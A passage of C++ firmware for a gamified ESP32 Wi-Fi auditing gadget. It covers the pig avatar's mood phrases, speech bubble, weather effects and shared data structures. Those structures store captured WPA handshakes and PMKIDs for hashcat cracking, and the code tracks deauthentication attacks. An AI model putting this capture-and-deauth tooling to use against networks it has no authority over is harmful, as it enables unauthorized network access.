static bool tryQueueRiddle() {
  if (riddleShownThisBoot) return false;
  if (currentMode != PorkchopMode::IDLE) return false;
  if (random(0, 100) >= 30) return false;
  riddleShownThisBoot = true;
  riddlePendingAch    = true;   // Signal update() to unlock the achievement
  int pick = random(0, RIDDLE_COUNT);
  SET_PHRASE(currentPhrase, RIDDLES[pick][0]);
  phraseQueueCount = 0;
  for (int i = 1; i < 5 && phraseQueueCount < 4; i++) {
    SET_PHRASE(phraseQueue[phraseQueueCount++], RIDDLES[pick][i]);
  }
  lastQueuePop = millis();
  lastPhraseChange = millis();
  return true;
}

void selectPhrase() {
  int effectiveMood = getEffectiveHappiness();

  // 30% chance once per boot to show cryptic riddle in IDLE
  if (tryQueueRiddle()) return;

  // 3% rare lore
  int roll = random(0, 100);
  if (roll < 3) {
    int count = sizeof(PHRASES_RARE_LORE)/sizeof(PHRASES_RARE_LORE[0]);
    SET_PHRASE(currentPhrase, PHRASES_RARE_LORE[random(0, count)]);
    return;
  }
  // 2% rare
  if (roll < 5) {
    int count = sizeof(PHRASES_RARE)/sizeof(PHRASES_RARE[0]);
    int idx = pickPhrase(PhraseCategory::RARE, count);
    SET_PHRASE(currentPhrase, PHRASES_RARE[idx]);
    return;
  }

  bool isWarhog = (currentMode == PorkchopMode::WARHOG_MODE);
  bool isCD     = (currentMode == PorkchopMode::DNH_MODE);

  if (effectiveMood > 70) {
    const char** p = isWarhog ? PHRASES_HAPPY_WARHOG : isCD ? PHRASES_HAPPY_CD : PHRASES_HAPPY_OINK;
    int c = isWarhog ? 11 : isCD ? 11 : 11;
    SET_PHRASE(currentPhrase, p[pickPhrase(PhraseCategory::HAPPY, c)]);
  } else if (effectiveMood > 30) {
    const char** p = isWarhog ? PHRASES_HAPPY_WARHOG : isCD ? PHRASES_HAPPY_CD : PHRASES_HAPPY_OINK;
    SET_PHRASE(currentPhrase, p[pickPhrase(PhraseCategory::HAPPY, 11)]);
  } else if (effectiveMood > -10) {
    SET_PHRASE(currentPhrase, PHRASES_HUNTING[pickPhrase(PhraseCategory::HUNTING, 6)]);
  } else if (effectiveMood > -50) {
    SET_PHRASE(currentPhrase, PHRASES_SLEEPY_OINK[pickPhrase(PhraseCategory::SLEEPY, 8)]);
  } else {
    SET_PHRASE(currentPhrase, PHRASES_SAD_OINK[pickPhrase(PhraseCategory::SAD, 12)]);
  }
}

void updateAvatarState() {
  int mood = getEffectiveHappiness();
  Avatar::setMoodIntensity(mood);

  switch (currentMode) {
    case PorkchopMode::OINK_MODE:
    case PorkchopMode::SPECTRUM_MODE:
      Avatar::setState(AvatarState::HUNTING); break;
    case PorkchopMode::PIGGYBLUES_MODE:
      Avatar::setState(AvatarState::ANGRY); break;
    case PorkchopMode::WARHOG_MODE:
      Avatar::setState(mood > 70 ? AvatarState::EXCITED : mood > 10 ? AvatarState::HAPPY : AvatarState::NEUTRAL);
      break;
    default:
      if (mood > 70)       Avatar::setState(AvatarState::EXCITED);
      else if (mood > 30)  Avatar::setState(AvatarState::HAPPY);
      else if (mood > -10) Avatar::setState(AvatarState::NEUTRAL);
      else if (mood > -50) Avatar::setState(AvatarState::SLEEPY);
      else                 Avatar::setState(AvatarState::SAD);
      break;
  }
}

void update() {
  uint32_t now = millis();
  if (phraseQueueCount > 0) { processQueue(); updateAvatarState(); return; }

  // Milestone: first 10 networks
  static uint32_t milestonesShown = 0;
  if (networkCount >= 10 && !(milestonesShown & 0x01)) {
    milestonesShown |= 0x01;
    SET_PHRASE(currentPhrase, "10 TRUFFLES BABY");
    applyMomentumBoost(15);
    lastPhraseChange = now;
  }

  // Challenge proximity hype (fires when a challenge hits 80%+)
  if (pickChallengePhraseIfDue(now)) { updateAvatarState(); return; }

  // Natural decay and phrase cycle
  if (now - lastPhraseChange > phraseInterval) {
    happiness = constrain(happiness - 1, -100, 100);
    selectPhrase();
    lastPhraseChange = now;
  }

  // Periodic save
  static uint32_t lastSave = 0;
  if (now - lastSave > 60000) { saveMood(); lastSave = now; }

  updateAvatarState();
}

void onNewNetwork_ext(const char* apName, int8_t rssi, uint8_t channel) {
  happiness = min(happiness + 3, 100);
  applyMomentumBoost(10);
  lastActivityTime = millis();
  Avatar::sniff();

  // Throttle phrase updates — don't cycle every single network during a bulk scan
  // Only update phrase if pig has been saying the same thing for at least 4 seconds
  uint32_t now = millis();
  if (now - lastPhraseChange < 4000) return;

  char buf[64];
  if (apName && strlen(apName) > 0) {
    char ap[24]; strncpy(ap, apName, 20); ap[20] = '\0';
    const char* templates[] = {"sniffed %s ch%d", "%s %ddb yum", "found %s oink"};
    snprintf(buf, sizeof(buf), templates[random(0,3)], ap, (int)channel);
  } else {
    snprintf(buf, sizeof(buf), "sneaky truffle CH%d %ddB", channel, rssi);
  }
  SET_PHRASE(currentPhrase, buf);
  lastPhraseChange = now;
}

void onHandshakeCaptured(const char* apName) {
  happiness = min(happiness + 10, 100);
  applyMomentumBoost(30);
  lastActivityTime = millis();
  Avatar::sniff();
  Avatar::cuteJump();
  char buf[48];
  if (apName && strlen(apName) > 0) {
    char ap[24]; strncpy(ap, apName, 20); ap[20] = '\0';
    const char* t[] = {"%s pwned", "%s gg ez", "rekt %s"};
    snprintf(buf, sizeof(buf), t[random(0,3)], ap);
  } else {
    const char** ep = PHRASES_EXCITED_OINK;
    strncpy(buf, ep[pickPhrase(PhraseCategory::EXCITED, 8)], sizeof(buf)-1);
  }
  SET_PHRASE(currentPhrase, buf);
  char buf2[32]; snprintf(buf2, sizeof(buf2), "%d today!", handshakeCount);
  queuePhrase(buf2, "oink++");
  lastPhraseChange = millis();
}

void onSniffing(uint16_t netCount, uint8_t channel) {
  lastActivityTime = millis();
  // Throttle — only update phrase every 5s during passive sniffing
  uint32_t now = millis();
  if (now - lastPhraseChange < 5000) return;
  int count = sizeof(PHRASES_SNIFFING)/sizeof(PHRASES_SNIFFING[0]);
  int idx = pickPhrase(PhraseCategory::SNIFFING, count);
  char buf[64];
  snprintf(buf, sizeof(buf), "%s CH%d (%d APs)", PHRASES_SNIFFING[idx], channel, netCount);
  SET_PHRASE(currentPhrase, buf);
  lastPhraseChange = now;
}

void onIdle() {
  int count = sizeof(PHRASES_MENU_IDLE)/sizeof(PHRASES_MENU_IDLE[0]);
  SET_PHRASE(currentPhrase, PHRASES_MENU_IDLE[pickPhrase(PhraseCategory::MENU_IDLE, count)]);
  lastPhraseChange = millis();
}

const char* getCurrentPhrase() { return currentPhrase; }
int getCurrentHappiness() { return happiness; }

// Speech bubble draw — exact port of original bubble positioning logic
// Adapted for CYD canvas dimensions (320 wide, MAIN_H=200 tall)
void drawBubble() {
  if (Avatar::isTransitioning()) return;

  const char* phrase = currentPhrase;
  if (!phrase || !phrase[0]) return;

  // Word-wrap to lines (uppercase, max 16 chars/line like original)
  char upper[128];
  int len = 0;
  while (phrase[len] && len < 127) { upper[len] = toupper(phrase[len]); len++; }
  upper[len] = '\0';

  char lines[5][24];
  uint8_t lineCount = 0;
  uint8_t longestLine = 1;
  int i = 0;
  while (i < len && lineCount < 5) {
    while (i < len && upper[i] == ' ') i++;
    if (i >= len) break;
    int lineStart = i;
    int lineEnd = len;
    int remaining = len - i;
    if (remaining > 16) {
      bool hasSpace = false;
      int lastSpace = 0;
      for (int j = i; j < i+16 && j < len; j++) {
        if (upper[j] == ' ') { hasSpace = true; lastSpace = j; }
      }
      if (hasSpace && lastSpace > i) lineEnd = lastSpace;
      else lineEnd = min(i+16, len);
    }
    int ll = lineEnd - lineStart;
    if (ll > 23) ll = 23;
    memcpy(lines[lineCount], upper + lineStart, ll);
    lines[lineCount][ll] = '\0';
    if (ll > longestLine) longestLine = ll;
    lineCount++;
    i = (lineEnd < len && upper[lineEnd] == ' ') ? lineEnd+1 : lineEnd;
  }
  if (lineCount == 0) return;

  // Bubble sizing
  const int MIN_W = 60, MAX_W = 155;
  int bubbleW = constrain(longestLine * 12 + 14, MIN_W, MAX_W);
  const int lineH = 16;
  int bubbleH = 8 + (lineCount * lineH);
  if (bubbleH > 54) bubbleH = 54;  // max 3 lines visible

  int pigX = Avatar::getCurrentX();
  // Pig head center X: pig frame is ~6 chars wide at size 3 (18px/char) = 108px
  // Head row starts at pigX, center approximately pigX+54
  int pigHeadCenterX = pigX + 54;
  int pigHeadY = 65;  // matches Avatar::draw() startY

  // Bubble always sits in the zone ABOVE the pig (Y=2 to pigHeadY-7)
  // Arrow points DOWN from bubble bottom to pig head
  const int ARROW_LEN = 7;
  const int BUBBLE_TOP_MARGIN = 2;

  int bubbleY = BUBBLE_TOP_MARGIN;
  // Horizontally center bubble over pig head, clamped to screen
  int bubbleX = pigHeadCenterX - bubbleW / 2;
  if (bubbleX < 2) bubbleX = 2;
  if (bubbleX + bubbleW > DISPLAY_W - 2) bubbleX = DISPLAY_W - 2 - bubbleW;

  int arrowTipY   = pigHeadY - 2;          // just above pig head
  int arrowBaseY  = bubbleY + bubbleH;      // bubble bottom
  // If bubble bottom would overlap pig, clamp bubble up
  if (arrowBaseY > arrowTipY - ARROW_LEN) {
    bubbleY = arrowTipY - ARROW_LEN - bubbleH;
    if (bubbleY < BUBBLE_TOP_MARGIN) bubbleY = BUBBLE_TOP_MARGIN;
    arrowBaseY = bubbleY + bubbleH;
  }

  // Draw bubble
  mainSprite.fillRoundRect(bubbleX, bubbleY, bubbleW, bubbleH, 5, colorFG());

  // Downward arrow from bubble bottom to pig head
  int arrowMidX = constrain(pigHeadCenterX, bubbleX + 6, bubbleX + bubbleW - 6);
  mainSprite.fillTriangle(
    arrowMidX,         arrowTipY,
    arrowMidX - 7,     arrowBaseY,
    arrowMidX + 7,     arrowBaseY,
    colorFG()
  );

  // Text in bubble
  mainSprite.setTextSize(1);
  mainSprite.setTextDatum(TL_DATUM);
  mainSprite.setTextColor(colorBG(), colorFG());
  int tx = bubbleX + 5;
  int ty = bubbleY + 4;
  for (int ln = 0; ln < lineCount; ln++) {
    mainSprite.drawString(lines[ln], tx, ty + ln * lineH);
  }
}

void onPassiveRecon(uint16_t nets, uint8_t ch) {
  int cnt=sizeof(PHRASES_SNIFFING)/sizeof(PHRASES_SNIFFING[0]);
  char buf[48]; snprintf(buf,sizeof(buf),"PASSIVE CH%d (%d APs)",ch,nets);
  SET_PHRASE(currentPhrase,buf); lastPhraseChange=millis();
}
void onWarhogUpdate() {
  int cnt=sizeof(PHRASES_WARHOG)/sizeof(PHRASES_WARHOG[0]);
  SET_PHRASE(currentPhrase,PHRASES_WARHOG[pickPhrase(PhraseCategory::WARHOG,cnt)]);
  lastPhraseChange=millis();
}
void onWarhogFound(const char* label, int8_t rssi) {
  (void)rssi; SET_PHRASE(currentPhrase,label); applyMomentumBoost(5); lastPhraseChange=millis();
}
void setStatusMessage(const char* msg) {
  SET_PHRASE(currentPhrase,msg); lastPhraseChange=millis();
}
void onPMKIDCaptured(const char* ap) {
  happiness=min(happiness+8,100); applyMomentumBoost(25); lastActivityTime=millis();
  Avatar::cuteJump();
  char buf[48];
  if(ap&&ap[0]){ char a[24]; strncpy(a,ap,20); a[20]=0; snprintf(buf,sizeof(buf),"PMKID! %s",a); }
  else { strncpy(buf,"PMKID CAPTURED!",sizeof(buf)); }
  SET_PHRASE(currentPhrase,buf); lastPhraseChange=millis();
}
void onNewNetwork(const char* ssid, int8_t rssi, uint8_t ch) {
  onNewNetwork_ext(ssid,rssi,ch);
}

void onBored(uint16_t netCount) {
  if (netCount == 0) setStatusMessage("nothin out here bruv");
  else { char b[40]; snprintf(b,sizeof(b),"all %d locked or pmf'd",netCount); setStatusMessage(b); }
  Avatar::setGrassMoving(false);
}

void onDeauthing(const char* ssid, uint32_t count) {
  char b[48];
  if (ssid&&ssid[0]) snprintf(b,sizeof(b),"ZAPPING %s [%lu]",ssid,count);
  else               snprintf(b,sizeof(b),"DEAUTH STORM [%lu]",count);
  setStatusMessage(b);
}

void resetChallengeHype() { challengeHypedFlags = 0; }

} // namespace Mood
// ── Weather ─────────────────────────────────────────────────────────────────
namespace Weather {

// Cloud parallax state
static char  cloudPattern[40] = {0};
static bool  cloudDirection   = true;   // true = drift right
static uint32_t lastCloudUpdate   = 0;
static uint32_t lastCloudParallax = 0;
static const uint16_t CLOUD_SPEED_MS = 14400;
static const uint8_t  CLOUD_PARALLAX_SHIFTS = 6;

// Rain state
struct RainDrop { float x, y; uint8_t speed; };
static const int RAIN_DROP_COUNT = 25;
static RainDrop  rainDrops[RAIN_DROP_COUNT] = {{0}};
static bool      rainActive   = false;
static bool      rainDecided  = false;
static int       lastMoodTier = -1;
static uint32_t  lastRainUpdate = 0;
static const uint16_t RAIN_SPEED_MS = 30;

// Thunder state
static bool     thunderFlashing        = false;
static uint32_t lastThunderStorm       = 0;
static uint32_t thunderFlashStart      = 0;
static uint8_t  thunderFlashesRemain   = 0;
static uint8_t  thunderFlashState      = 0;
static uint32_t thunderMinInterval     = 999999;
static uint32_t thunderMaxInterval     = 999999;

// Wind state
struct WindParticle { float x, y, speed; bool active; };
static WindParticle windParticles[6]   = {{0}};
static bool      windActive            = false;
static uint32_t  lastWindGust          = 0;
static uint32_t  windGustDuration      = 0;
static uint32_t  windGustInterval      = 15000;
static uint32_t  lastWindUpdate        = 0;

static void resetCloudPattern() {
  for (int i = 0; i < 39; i++) cloudPattern[i] = ' ';
  cloudPattern[39] = '\0';
  int pos = 0;
  while (pos < 36) {
    const char cc[] = {'.', '-', '_'};
    int segs = random(2, 5);
    for (int s = 0; s < segs && pos < 39; s++) {
      char ch = cc[random(0, 3)];
      int len = random(1, 6);
      for (int k = 0; k < len && pos < 39; k++) cloudPattern[pos++] = ch;
    }
    pos += random(4, 10);
  }
}

static void shiftCloud(bool right, bool mutate) {
  if (right) {
    char last = cloudPattern[38];
    for (int i = 38; i > 0; i--) cloudPattern[i] = cloudPattern[i-1];
    cloudPattern[0] = last;
  } else {
    char first = cloudPattern[0];
    for (int i = 0; i < 38; i++) cloudPattern[i] = cloudPattern[i+1];
    cloudPattern[38] = first;
  }
  if (mutate && random(0, 50) == 0) {
    int p = random(0, 39);
    if (cloudPattern[p] != ' ') {
      const char cc[] = {'.', '-', '_'};
      cloudPattern[p] = cc[random(0, 3)];
    }
  }
}

static int getMoodTier(int mood, int cur) {
  if (cur < 0) {
    if (mood <= -40) return 2;
    if (mood <= -20) return 1;
    return 0;
  }
  switch (cur) {
    case 0: if (mood <= -25) return (mood <= -45) ? 2 : 1; return 0;
    case 1: if (mood <= -45) return 2; if (mood > -15) return 0; return 1;
    case 2: if (mood > -35) return (mood > -15) ? 0 : 1; return 2;
  }
  return 0;
}

void setRaining(bool active) {
  if (active && !rainActive) {
    for (int i = 0; i < RAIN_DROP_COUNT; i++) {
      rainDrops[i].x = (float)random(0, 320);
      rainDrops[i].y = (float)random(16, 85);
      rainDrops[i].speed = random(5, 9);
    }
  } else if (!active && rainActive) {
    thunderFlashing = false;
    thunderFlashState = 0;
    thunderFlashesRemain = 0;
    lastThunderStorm = millis();
  }
  rainActive = active;
}

void setMoodLevel(int momentum) {
  int newTier = getMoodTier(momentum, lastMoodTier);
  if (!rainDecided || newTier != lastMoodTier) {
    lastMoodTier = newTier;
    rainDecided = true;
    if (newTier == 2) {
      setRaining(random(0,100) < 70);
      thunderMinInterval = 30000; thunderMaxInterval = 60000;
    } else if (newTier == 1) {
      setRaining(random(0,100) < 35);
      thunderMinInterval = 60000; thunderMaxInterval = 120000;
    } else {
      setRaining(false);
      thunderMinInterval = 999999; thunderMaxInterval = 999999;
    }
  }
}

void init() {
  resetCloudPattern();
  for (int i = 0; i < 6; i++) windParticles[i].active = false;
  lastCloudUpdate  = millis();
  lastCloudParallax = lastCloudUpdate;
  lastWindGust     = millis();
  lastThunderStorm = millis();
}

bool isThunderFlashing() { return thunderFlashing && thunderFlashState == 1; }
bool isRaining()         { return rainActive; }

void update() {
  uint32_t now = millis();

  // Clouds
  if (now - lastCloudUpdate >= CLOUD_SPEED_MS) {
    lastCloudUpdate = now;
    shiftCloud(cloudDirection, true);
  }
  if (Avatar::isGrassMoving()) {
    uint32_t pi = (uint32_t)Avatar::getGrassSpeed() * CLOUD_PARALLAX_SHIFTS;
    if (pi < 150) pi = 150;
    if (now - lastCloudParallax >= pi) {
      lastCloudParallax = now;
      shiftCloud(Avatar::isGrassDirectionRight(), false);
    }
  } else {
    lastCloudParallax = now;
  }

  // Rain movement
  if (rainActive && now - lastRainUpdate >= RAIN_SPEED_MS) {
    lastRainUpdate = now;
    float drift = 0.0f;
    if (Avatar::isGrassMoving()) {
      uint16_t gs = Avatar::getGrassSpeed();
      if (!gs) gs = 1;
      float ppm = (320.0f / 26.0f) / (float)gs;
      drift = ppm * (float)RAIN_SPEED_MS * 0.4f;
      if (Avatar::isGrassDirectionRight()) drift = -drift;
    }
    for (int i = 0; i < RAIN_DROP_COUNT; i++) {
      rainDrops[i].y += rainDrops[i].speed;
      rainDrops[i].x += drift;
      if (rainDrops[i].x < 0)   rainDrops[i].x += 320.0f;
      if (rainDrops[i].x >= 320) rainDrops[i].x -= 320.0f;
      if (rainDrops[i].y >= 140.0f) {   // clip above grass (grass at ~y=152)
        rainDrops[i].y = (float)random(16, 23);
        rainDrops[i].x = (float)random(0, 320);
        rainDrops[i].speed = random(5, 9);
      }
    }
  }

  // Thunder
  if (rainActive) {
    if (!thunderFlashing && thunderFlashesRemain == 0) {
      if (now - lastThunderStorm > thunderMinInterval) {
        uint32_t interval = random(thunderMinInterval, thunderMaxInterval);
        if (now - lastThunderStorm >= interval) {
          thunderFlashesRemain = random(2, 4);
          lastThunderStorm = now;
        }
      }
    }
    if (thunderFlashesRemain > 0 && !thunderFlashing) {
      thunderFlashing = true;
      thunderFlashStart = now;
      thunderFlashState = 1;
      thunderFlashesRemain--;
    }
    if (thunderFlashing) {
      uint32_t el = now - thunderFlashStart;
      if (thunderFlashState == 1 && el > (uint32_t)random(30, 60)) {
        thunderFlashState = 0; thunderFlashStart = now;
      } else if (thunderFlashState == 0 && el > (uint32_t)random(20, 40)) {
        thunderFlashing = false; thunderFlashState = 0;
      }
    }
  }

  // Wind gusts
  if (!windActive && now - lastWindGust > windGustInterval) {
    if (random(0, 100) < 30) {
      windActive = true;
      windGustDuration = random(2000, 4000);
      lastWindGust = now;
      for (int i = 0; i < 6; i++) {
        windParticles[i].x = -10.0f - random(0, 50);
        windParticles[i].y = (float)random(20, 140);
        windParticles[i].speed = (float)random(3, 6);
        windParticles[i].active = true;
      }
    } else {
      windGustInterval = random(15000, 30000);
      lastWindGust = now;
    }
  }
  if (windActive) {
    if (now - lastWindGust > windGustDuration) {
      windActive = false;
      windGustInterval = random(15000, 30000);
      for (int i = 0; i < 6; i++) windParticles[i].active = false;
    } else if (now - lastWindUpdate > 50) {
      lastWindUpdate = now;
      for (int i = 0; i < 6; i++) {
        if (windParticles[i].active) {
          windParticles[i].x += windParticles[i].speed;
          windParticles[i].y += ((float)random(0, 3) - 1.0f) * 0.5f;
          if (windParticles[i].x > 330.0f) windParticles[i].active = false;
        }
      }
    }
  }
}

// Draw clouds into sprite (call BEFORE Avatar::draw so pig is on top)
void drawClouds() {
  uint16_t col = isThunderFlashing() ? colorBG() : colorFG();
  mainSprite.setTextSize(1);
  mainSprite.setTextColor(col, colorBG());
  mainSprite.setTextDatum(TL_DATUM);
  mainSprite.drawString(cloudPattern, 0, 2);
}

// Draw rain + wind (call AFTER Avatar::draw so weather is on top of background but pig is drawn over it)
void draw() {
  uint16_t col = isThunderFlashing() ? colorBG() : colorFG();
  // Rain
  if (rainActive) {
    for (int i = 0; i < RAIN_DROP_COUNT; i++) {
      int x = (int)rainDrops[i].x;
      int y = (int)rainDrops[i].y;
      if (y < 0) continue;
      for (int dy = 0; dy < 6 && y+dy < 140; dy++) {
        mainSprite.drawPixel(x,   y+dy, col);
        if (x+1 < 320) mainSprite.drawPixel(x+1, y+dy, col);
      }
    }
  }
  // Wind
  if (windActive) {
    mainSprite.setTextSize(1);
    mainSprite.setTextColor(col, colorBG());
    for (int i = 0; i < 6; i++) {
      if (windParticles[i].active) {
        int x = (int)windParticles[i].x;
        int y = (int)windParticles[i].y;
        if (x >= 0 && x < 320) mainSprite.drawChar('.', x, y);
      }
    }
  }
}

} // namespace Weather

// ============================================================
// SHARED STRUCTS — defined here at global scope so Display
// (which appears before the mode namespaces) can use them fully.
// The mode namespaces reference these via the global scope.
// ============================================================

// DetectedNetwork: used by NetworkRecon, OinkMode, DNHMode, WarhogMode, Display
struct DetectedNetwork {
  uint8_t  bssid[6];
  char     ssid[33];
  int8_t   rssi;
  int8_t   rssiAvg;
  uint8_t  channel;
  wifi_auth_mode_t authmode;
  uint32_t firstSeen;
  uint32_t lastSeen;
  uint32_t lastBeaconSeen;
  uint16_t beaconCount;
  uint16_t beaconIntervalEmaMs;
  bool     isTarget;
  bool     hasPMF;
  bool     hasHandshake;
  uint8_t  attackAttempts;
  bool     isHidden;
  uint32_t lastDataSeen;
  uint32_t cooldownUntil;
  uint64_t clientBitset;
};

// BaconAP: used by BaconMode and Display
struct BaconAP {
  uint8_t bssid[6];
  char    ssid[33];
  int8_t  rssi;
  uint8_t channel;
};

// EAPOL capture structs — used by OinkMode, DNHMode, SerialDump, SpiffsSave
struct EAPOLFrame {
  uint8_t  data[512];       // EAPOL payload (for hashcat 22000)
  uint8_t  fullFrame[300];  // Full 802.11 frame (for PCAP)
  uint16_t len;
  uint16_t fullFrameLen;
  uint8_t  messageNum;
  uint32_t timestamp;
  int8_t   rssi;
};

struct CapturedHandshake {
  uint8_t    bssid[6];
  uint8_t    station[6];
  char       ssid[33];
  EAPOLFrame frames[4];     // M1, M2, M3, M4
  uint8_t    capturedMask;  // bits 0-3 = M1-M4 present
  uint32_t   firstSeen;
  uint32_t   lastSeen;
  bool       saved;
  uint8_t    saveAttempts;

  bool hasM1() const { return capturedMask & 0x01; }
  bool hasM2() const { return capturedMask & 0x02; }
  bool hasM3() const { return capturedMask & 0x04; }
  bool hasM4() const { return capturedMask & 0x08; }
  bool hasValidPair() const { return (hasM1()&&hasM2()) || (hasM2()&&hasM3()); }
  uint8_t getMessagePair() const {
    if (hasM1()&&hasM2()) return 0x00;
    if (hasM2()&&hasM3()) return 0x02;
    return 0xFF;
  }
};

struct CapturedPMKID {
  uint8_t  bssid[6];
  uint8_t  station[6];
  char     ssid[33];
  uint8_t  pmkid[16];
  uint32_t timestamp;
  bool     saved;
  uint8_t  saveAttempts;
};

// SirloinDevice: used by PigSync and Display (BOAR_BROS screen)
struct SirloinDevice {
  uint8_t  mac[6];
  int8_t   rssi;
  uint16_t pendingCaptures;
  uint8_t  flags;
  uint32_t lastSeen;
  char     name[16];
  uint8_t  batteryPct;
  bool     hasGrunt;
};

// ── Client tracking constants (used by NetworkRecon + Display) ──
#define CLIENT_MAX_PER_AP  6
#define CLIENT_AP_SLOTS    20

// ============================================================
// FORWARD DECLARATIONS
// All mode namespaces are defined AFTER Display, so we need
// forward decls here so Display::drawTopBar/drawBottomBar/update
// can call them without moving the whole Display block.
// ============================================================
namespace OUI {
  const char* getVendor(const uint8_t* mac);
}
enum class HeapPressureLevel : uint8_t;
namespace HeapHealth {
  void    update();
  uint8_t getDisplayPercent();
  uint8_t getPercent();
  HeapPressureLevel getPressureLevel();
  float   getKnuthRatio();
  uint32_t getMinFree();
  uint32_t getMinLargest();
  void    setKnuthEnabled(bool e);
}
namespace NetworkRecon {
  std::vector<DetectedNetwork>& getNetworks();
  uint16_t getNetworkCount();
  uint32_t getPacketCount();
  uint8_t  getChannel();
  bool     isChannelLocked();
  bool     isRunning();
  void     enterCritical();
  void     exitCritical();
  void     setChannel(uint8_t ch);
  void     hopChannelTo(uint8_t ch);
  void     lockChannel(uint8_t ch);
  void     unlockChannel();
  bool     isPaused();
  void     pause();
  void     resume();
  void     start();
  void     stop();
  uint8_t  getClients(const uint8_t* apBssid, uint8_t* buf, uint8_t maxCount);
}

// ── Achievement types at global scope (needed by Display before XP is defined) ──
enum PorkAchievement : uint64_t {
  ACH_NONE            = 0,
  ACH_FIRST_BLOOD     = 1ULL<<0,   ACH_CENTURION       = 1ULL<<1,
  ACH_MARATHON_PIG    = 1ULL<<2,   ACH_NIGHT_OWL       = 1ULL<<3,
  ACH_GHOST_HUNTER    = 1ULL<<4,   ACH_APPLE_FARMER    = 1ULL<<5,
  ACH_WARDRIVER       = 1ULL<<6,   ACH_DEAUTH_KING     = 1ULL<<7,
  ACH_PMKID_HUNTER    = 1ULL<<8,   ACH_WPA3_SPOTTER    = 1ULL<<9,
  ACH_GPS_MASTER      = 1ULL<<10,  ACH_TOUCH_GRASS     = 1ULL<<11,
  ACH_SILICON_PSYCHO  = 1ULL<<12,  ACH_CLUTCH_CAPTURE  = 1ULL<<13,
  ACH_SPEED_RUN       = 1ULL<<14,  ACH_CHAOS_AGENT     = 1ULL<<15,
  ACH_NIETZSWINE      = 1ULL<<16,  ACH_TEN_THOUSAND    = 1ULL<<17,
  ACH_NEWB_SNIFFER    = 1ULL<<18,  ACH_FIVE_HUNDRED    = 1ULL<<19,
  ACH_OPEN_SEASON     = 1ULL<<20,  ACH_WEP_LOLZER      = 1ULL<<21,
  ACH_HANDSHAKE_HAM   = 1ULL<<22,  ACH_FIFTY_SHAKES    = 1ULL<<23,
  ACH_PMKID_FIEND     = 1ULL<<24,  ACH_TRIPLE_THREAT   = 1ULL<<25,
  ACH_HOT_STREAK      = 1ULL<<26,  ACH_FIRST_DEAUTH    = 1ULL<<27,
  ACH_DEAUTH_THOUSAND = 1ULL<<28,  ACH_RAMPAGE         = 1ULL<<29,
  ACH_HALF_MARATHON   = 1ULL<<30,  ACH_HUNDRED_KM      = 1ULL<<31,
  ACH_GPS_ADDICT      = 1ULL<<32,  ACH_ULTRAMARATHON   = 1ULL<<33,
  ACH_PARANOID_ANDROID= 1ULL<<34,  ACH_SAMSUNG_SPRAY   = 1ULL<<35,
  ACH_WINDOWS_PANIC   = 1ULL<<36,  ACH_BLE_BOMBER      = 1ULL<<37,
  ACH_OINKAGEDDON     = 1ULL<<38,  ACH_SESSION_VET     = 1ULL<<39,
  ACH_FOUR_HOUR_GRIND = 1ULL<<40,  ACH_EARLY_BIRD      = 1ULL<<41,
  ACH_WEEKEND_WARRIOR = 1ULL<<42,  ACH_ROGUE_SPOTTER   = 1ULL<<43,
  ACH_HIDDEN_MASTER   = 1ULL<<44,  ACH_WPA3_HUNTER     = 1ULL<<45,
  ACH_MAX_LEVEL       = 1ULL<<46,  ACH_ABOUT_JUNKIE    = 1ULL<<47,
  ACH_GOING_DARK      = 1ULL<<48,  ACH_GHOST_PROTOCOL  = 1ULL<<49,
  ACH_SHADOW_BROKER   = 1ULL<<50,  ACH_SILENT_ASSASSIN = 1ULL<<51,
  ACH_ZEN_MASTER      = 1ULL<<52,  ACH_FIRST_BRO       = 1ULL<<53,
  ACH_FIVE_FAMILIES   = 1ULL<<54,  ACH_MERCY_MODE      = 1ULL<<55,
  ACH_WITNESS_PROTECT = 1ULL<<56,  ACH_FULL_ROSTER     = 1ULL<<57,
  ACH_PROPHECY_WITNESS= 1ULL<<58,  ACH_PACIFIST_RUN    = 1ULL<<59,
  ACH_QUICK_DRAW      = 1ULL<<60,  ACH_DEAD_EYE        = 1ULL<<61,
  ACH_HIGH_NOON       = 1ULL<<62,  ACH_FULL_CLEAR      = 1ULL<<63,
};
struct AchDef { PorkAchievement flag; const char* name; const char* howTo; };
extern const AchDef ACH_LIST[];
extern const uint8_t ACH_COUNT;

namespace XP {
  uint8_t     getLevel();
  uint32_t    getTotalXP();
  uint32_t    getSessionXP();
  uint16_t    getSessions();
  const char* getTitle();
  uint8_t     getProgress();
  bool        shouldShowXP();
  uint16_t    lastGainAmt();
  uint32_t    getLifetimeNets();
  uint32_t    getLifetimeHS();
  uint32_t    getLifetimePMKID();
  uint32_t    getLNets();
  uint32_t    getLHS();
  uint32_t    getLPMKID();
  uint32_t    getLDeauth();
  uint32_t    getUnlockables();
  bool        hasUnlockable(uint8_t bit);
  void        setUnlockable(uint8_t bit);
  void        save();
  void        init();
  void        addNet(); void addHS(); void addPMKID(); void addDeauth();
  void        addWarhog(); void addBLE(uint8_t kind);
  void        gain(uint8_t ev);
  // Achievements
  bool        hasAchievement(PorkAchievement a);
  uint64_t    getAchievements();
  uint8_t     getAchievementCount();
  void        unlockAchievement(PorkAchievement a);
}
namespace OinkMode {
  uint16_t    getHandshakeCount();
  uint16_t    getPMKIDCount();
  uint32_t    getDeauthCount();
  bool        isLocking();
  bool        addCurrentTargetToBoarBros();
  uint8_t     getBoarBroCount();
  const char* getStateName();
  const char* getTargetSSID();
  const char* getLastPwnedSSID();
  const std::vector<CapturedHandshake>& getHandshakes();
  const std::vector<CapturedPMKID>&     getPMKIDs();
  void injectHandshake(const CapturedHandshake& hs);
  void injectPMKID(const CapturedPMKID& pm);
}
namespace DNHMode {
  uint16_t getHSCount();
  uint16_t getPMKIDCount();
  const std::vector<CapturedHandshake>& getHandshakes();
}
namespace SpiffsSave {
  bool mount();
  void saveAll();
  void saveHandshakes();
  void savePMKIDs();
  void saveWigleCSV();
  void loadAll();
  void wipeAll();
  void saveHandshakeToSD(const CapturedHandshake& hs);
  void savePMKIDToSD(const CapturedPMKID& pm);
}
namespace PigSync {
  void start();
  void stop();
  void update();
  bool isRunning();
  bool isScanning();
  bool isConnected();
  bool isSyncing();
  bool isSyncComplete();
  const char* getStateName();
  const char* getLastError();
  uint8_t  getDeviceCount();
  uint16_t getRemotePMKIDs();
  uint16_t getRemoteHS();
  uint16_t getSyncedPMKIDs();
  uint16_t getSyncedHS();
  uint8_t  getLastBounty();
  uint8_t  getDialoguePhase();
  const char* getPapaHello();
  const char* getSonHello();
  const char* getSonGoodbye();
  bool connectTo(uint8_t idx);
